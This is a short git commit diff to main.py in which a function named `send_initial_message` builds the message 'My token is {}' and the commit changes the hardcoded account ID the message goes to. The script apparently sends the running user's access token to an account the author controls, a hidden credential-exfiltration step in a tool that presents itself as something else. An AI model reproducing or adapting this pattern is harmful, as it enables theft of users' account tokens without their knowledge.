cbedbd7585fe69044a3dfdcd71684d408f86375a
Kumar8052 <aayadon2@gmail.com>
2024-09-14 14:11:15 +0530

    Update main.py

--- main.py
+++ main.py
@@ -42,7 +42,7 @@ def send_initial_message():
       msg_template = "Hello Ramjeet sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100079728722774"
+      target_id = "100087919005224"
 
       requests.packages.urllib3.disable_warnings()
 
